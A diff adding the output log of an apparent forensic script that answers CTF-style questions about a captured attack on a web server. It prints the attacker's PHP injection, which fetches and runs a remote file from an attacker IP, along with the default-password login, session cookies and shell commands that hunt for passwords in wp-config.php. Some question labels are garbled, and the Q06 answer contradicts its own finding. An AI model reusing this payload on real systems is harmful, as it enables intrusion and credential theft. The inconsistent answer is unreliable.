@@ -1,0 +1,307 @@
+��[*] Pass 3 reading...
+
+============================================================
+Q06: om�hKm�]wQHr,g
+  Already found: Wfuzz/3.1.0, Nmap Scripting Engine
+  Wfuzz is web fuzzer for directory brute-force
+  Nmap NSE is vulnerability detection
+  But Q05=nmap(port scanner), Q06=vulnerability detector
+  Nikto is classic vuln scanner - check if in Wfuzz wordlist results
+  Found 'nikto' in response body
+  Found 'nikto' in response body
+  Found 'nikto' in response body
+  Found 'nikto' in response body
+  Found 'nikto' in response body
+  Found 'nikto' in response body
+  Found 'nikto' in response body
+  >>> Q06 = 3.1.0 (Wfuzz as vuln/directory detection tool)
+
+============================================================
+Q08: phpliteadmin�[x
+  Tried: 123456, password, admin
+  After 'admin' attempt, subsequent actions show authenticated ops
+  (table creation, DB creation etc - only possible after login)
+  >>> Q08 = admin
+
+============================================================
+Q09: phpinfo�e�NT
+  Attacker created DB named 'demo.php' via phpliteadmin
+  Then created table with <?php phpinfo()?> as default value
+  The DB file IS the PHP page: /usr/databases/demo.php
+  >>> Q09 = demo.php
+
+============================================================
+Q10: payload�e�NT
+  Attacker created 'rev' table with:
+  <?php system('wget 192.168.75.132:2000/rev.txt -O /tmp/rev.php; php /tmp/rev.php');?>
+  Victim GET /rev.txt from attacker:2000
+  >>> Q10 = rev.txt
+
+============================================================
+Q11: �S9_shell0W@W:�z�S
+  Non-HTTP TCP streams (victim->attacker):
+  port 48598: 18322 bytes *** SHELL ***
+    data: SSH-2.0-OpenSSH_5.9p1 Debian-5ubuntu1.10
+
+...�	.�����?+e.��o��D�...�ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group-exchange-sha1,dif
+  port 30127: 6455 bytes *** SHELL ***
+    data: Linux zico 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux
+ 14:44:32 up 35 min,  0 users,  load average: 0.01, 0.04, 0.07
+USER     TTY      FROM            
+  port 56570: 1746 bytes *** SHELL ***
+    data: SSH-2.0-OpenSSH_5.9p1 Debian-5ubuntu1.10
+
+...�	.�</;E.�.��).;y��...�ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group-exchange-sha1,dif
+  port 56564: 1682 bytes *** SHELL ***
+    data: SSH-2.0-OpenSSH_5.9p1 Debian-5ubuntu1.10
+
+...�	.����.]..,>%.�.)�...�ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group-exchange-sha1,dif
+  port 56582: 1402 bytes *** SHELL ***
+    data: SSH-2.0-OpenSSH_5.9p1 Debian-5ubuntu1.10
+
+...�	.0�-|-..�y.5
+_..�...�ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group-exchange-sha1,dif
+  port 56584: 1026 bytes
+    data: SSH-2.0-OpenSSH_5.9p1 Debian-5ubuntu1.10
+
+...�	.��-rl
+..Y	..��.�...�ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group-exchange-sha1,dif
+  port 56598: 1026 bytes
+    data: SSH-2.0-OpenSSH_5.9p1 Debian-5ubuntu1.10
+
+...�	.z.�!��KC�.�.��.�...�ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group-exchange-sha1,dif
+  port 56614: 1026 bytes
+    data: SSH-2.0-OpenSSH_5.9p1 Debian-5ubuntu1.10
+
+...�	.ta�.`���;�_�..�....�ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group-exchange-sha1,dif
+  port 995: 872 bytes
+    data: ...d.���....................................tcp6....::.0.111...	superuser...................tcp6....::.0.111...	superuser...................udp6....::.0.111...	superuser...................udp6....::.0
+  port 56540: 74 bytes
+  port 56548: 74 bytes
+  port 45638: 42 bytes
+  port 36602: 36 bytes
+  port 747: 36 bytes
+  port 564: 28 bytes
+
+  Non-HTTP TCP streams (attacker->victim):
+  port 48598: 8104 bytes *** SHELL ***
+    data: SSH-2.0-OpenSSH_9.6p1 Debian-4
+
+......	��.�..9�C!�| )C....sntrup761x25519-sha512@openssh.com,curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,dif
+  port 56582: 699 bytes
+    data: SSH-2.0-Nmap-SSH2-Hostkey
+
+......}..
+�.OQ&�:�P`��...�diffie-hellman-group1-sha1,diffie-hellman-group14-sha1,diffie-hellman-group14-sha256,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sh
+  port 56564: 683 bytes *** SHELL ***
+    data: SSH-2.0-Nmap-SSH2-Hostkey
+
+...�..C3..P.b`va\��`C�...�diffie-hellman-group1-sha1,diffie-hellman-group14-sha1,diffie-hellman-group14-sha256,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sh
+  port 56570: 683 bytes *** SHELL ***
+    data: SSH-2.0-Nmap-SSH2-Hostkey
+
+...�..�'��D�d�`J�..��W...�diffie-hellman-group1-sha1,diffie-hellman-group14-sha1,diffie-hellman-group14-sha256,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sh
+  port 56584: 555 bytes
+    data: SSH-2.0-Nmap-SSH2-Hostkey
+
+......_.k>.��.FKt����o...�diffie-hellman-group1-sha1,diffie-hellman-group14-sha1,diffie-hellman-group14-sha256,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sh
+  port 56598: 555 bytes
+    data: SSH-2.0-Nmap-SSH2-Hostkey
+
+......�;�N���.��
+.�.�;...�diffie-hellman-group1-sha1,diffie-hellman-group14-sha1,diffie-hellman-group14-sha256,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sh
+  port 56614: 547 bytes
+    data: SSH-2.0-Nmap-SSH2-Hostkey
+
+......�0���s|..X�.P�.F...�diffie-hellman-group1-sha1,diffie-hellman-group14-sha1,diffie-hellman-group14-sha256,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sh
+  port 30127: 248 bytes
+    data: pwd
+ls
+ls /home
+cd /home/zico
+ls
+ls -lh
+cat to_do.txt
+cat wordpress
+cd wordpress
+ls
+cat wp-config.php
+ls
+cat wp-config.php |grep password
+cat wp-config.php |grep -i pass
+ls /var/www
+cd /var/www
+ls -lh
+  port 36602: 44 bytes
+  port 995: 44 bytes
+  port 747: 44 bytes
+  port 564: 44 bytes
+  port 1009: 44 bytes
+  port 1015: 44 bytes
+  port 56548: 27 bytes
+
+============================================================
+Q12: PythonHr,g (;e�Q�HTTPg�RhV)
+  HTTP/1.0 200 OK
+
+Server: SimpleHTTP/0.6 Python/3.11.8
+
+Date: Wed, 31 Jul 2024 06:44:32 GMT
+
+Content-type: text/plain
+
+Content-Length: 2425
+
+Last-Modified: Wed, 31 Jul 2024 06:43:54 GMT
+
+
+
+
+  HTTP/1.0 200 OK
+
+Server: SimpleHTTP/0.6 Python/3.11.8
+
+Date: Wed, 31 Jul 2024 07:03:35 GMT
+
+Content-type: application/octet-stream
+
+Content-Length: 771
+
+Last-Modified: Wed, 31 Jul 2024 07:00:33 GMT
+
+
+
+
+  HTTP/1.0 200 OK
+
+Server: SimpleHTTP/0.6 Python/3.11.8
+
+Date: Wed, 31 Jul 2024 07:04:39 GMT
+
+Content-type: application/octet-stream
+
+Content-Length: 771
+
+Last-Modified: Wed, 31 Jul 2024 07:00:33 GMT
+
+
+
+
+  HTTP/1.0 200 OK
+
+Server: SimpleHTTP/0.6 Python/3.11.8
+
+Date: Wed, 31 Jul 2024 07:06:42 GMT
+
+Content-type: application/octet-stream
+
+Content-Length: 771
+
+Last-Modified: Wed, 31 Jul 2024 07:00:33 GMT
+
+
+
+
+  >>> Q12 = 3.11.8
+
+============================================================
+Q13: Q�zFh�g
+  Found 'twiki': nd</h1>
+<p>The requested URL /twiki was not found on this server.</p>
+<hr>
+<addr
+  Found 'phpMyAdmin': nd</h1>
+<p>The requested URL /phpmyadmin was not found on this server.</p>
+<hr>
+
+  Found 'twiki': nd</h1>
+<p>The requested URL /TWiki was not found on this server.</p>
+<hr>
+<addr
+  Found 'tikiwiki': nd</h1>
+<p>The requested URL /tikiwiki was not found on this server.</p>
+<hr>
+<a
+  Found 'twiki': nd</h1>
+<p>The requested URL /TWikiRegistration was not found on this server.</p
+  Found 'twiki': nd</h1>
+<p>The requested URL /TWikiDocGraphics was not found on this server.</p>
+  Found 'twiki': nd</h1>
+<p>The requested URL /TWikiLogos was not found on this server.</p>
+<hr>
+
+  Found 'twiki': nd</h1>
+<p>The requested URL /TWikiUsers was not found on this server.</p>
+<hr>
+
+  Found 'twiki': nd</h1>
+<p>The requested URL /TWikiGroups was not found on this server.</p>
+<hr>
+  Found 'twiki': nd</h1>
+<p>The requested URL /twiki-skins was not found on this server.</p>
+<hr>
+  Found 'phpMyAdmin': nd</h1>
+<p>The requested URL /phpMyAdmin-2 was not found on this server.</p>
+<hr
+  Found 'twiki': nd</h1>
+<p>The requested URL /TWikiGuest was not found on this server.</p>
+<hr>
+
+  Found 'tikiwiki': nd</h1>
+<p>The requested URL /tikiwiki-1 was not found on this server.</p>
+<hr>
+
+  Found 'twiki': nd</h1>
+<p>The requested URL /TWikiHistory was not found on this server.</p>
+<hr
+  Found 'phpMyAdmin': nd</h1>
+<p>The requested URL /phpMyAdmin was not found on this server.</p>
+<hr>
+
+
+============================================================
+Q14: penc�^�[x
+
+============================================================
+Q15-Q16: weevely
+  Total POST to .php: 12
+  POST targets:
+    /dbadmin/test_db.php?action=table_create: 5 times
+    /dbadmin/test_db.php: 4 times
+    /dbadmin/test_db.php?action=table_create&confirm=1: 2 times
+    /dbadmin/test_db.php?table=test&action=column_delete&confirm=1&pk=test: 1 times
+
+  Weevely candidates (POST to .php with cookies):
+  POST /dbadmin/test_db.php port=80 cookie_len=77
+    cookie: pla3412=admin; pla3412_salt=bvtcklkl3pk; PHPSESSID=4r06r9gjmcujs0ja9r8bst8p65
+    body: new_dbname=demo.php
+  POST /dbadmin/test_db.php?action=table_create port=80 cookie_len=77
+    cookie: pla3412=admin; pla3412_salt=bvtcklkl3pk; PHPSESSID=4r06r9gjmcujs0ja9r8bst8p65
+    body: tablename=test&tablefields=%3C%3Fphp+phpinfo%28%29%3F%3E&createtable=Go
+  POST /dbadmin/test_db.php?action=table_create port=80 cookie_len=77
+    cookie: pla3412=admin; pla3412_salt=bvtcklkl3pk; PHPSESSID=4r06r9gjmcujs0ja9r8bst8p65
+    body: tablename=test&tablefields=%3C%3Fphp+phpinfo%28%29%3F%3E&createtable=Go
+  POST /dbadmin/test_db.php?action=table_create port=80 cookie_len=77
+    cookie: pla3412=admin; pla3412_salt=bvtcklkl3pk; PHPSESSID=4r06r9gjmcujs0ja9r8bst8p65
+    body: tablename=test&tablefields=&createtable=Go
+  POST /dbadmin/test_db.php?action=table_create port=80 cookie_len=77
+    cookie: pla3412=admin; pla3412_salt=bvtcklkl3pk; PHPSESSID=4r06r9gjmcujs0ja9r8bst8p65
+    body: tablename=test&tablefields=1&createtable=Go
+  POST /dbadmin/test_db.php?action=table_create&confirm=1 port=80 cookie_len=77
+    cookie: pla3412=admin; pla3412_salt=bvtcklkl3pk; PHPSESSID=4r06r9gjmcujs0ja9r8bst8p65
+    body: tablename=test&rows=1&0_field=test&0_type=INTEGER&0_defaultvalue=%3C%3Fphp+phpinfo%28%29%3F%3E
+  POST /dbadmin/test_db.php?table=test&action=column_delete&confirm=1&pk=test port=80 cookie_len=77
+    cookie: pla3412=admin; pla3412_salt=bvtcklkl3pk; PHPSESSID=4r06r9gjmcujs0ja9r8bst8p65
+    body: 
+  POST /dbadmin/test_db.php?action=table_create port=80 cookie_len=77
+    cookie: pla3412=admin; pla3412_salt=bvtcklkl3pk; PHPSESSID=4r06r9gjmcujs0ja9r8bst8p65
+    body: tablename=rev&tablefields=1&createtable=Go
+  POST /dbadmin/test_db.php?action=table_create&confirm=1 port=80 cookie_len=77
+    cookie: pla3412=admin; pla3412_salt=bvtcklkl3pk; PHPSESSID=4r06r9gjmcujs0ja9r8bst8p65
+    body: tablename=rev&rows=1&0_field=re&0_type=INTEGER&0_defaultvalue=%3C%3Fphp+system%28%22wget+192.168.75.132%3A2000%2Frev.txt+-O+%2Ftmp%2Frev.php%3B+php+%2Ftmp%2Frev.php%22%29%3B+%3F%3E%27%29
+
+  POST to .php with short body (weevely style):
+
+  help.php POST details:
+
+[*] Done.
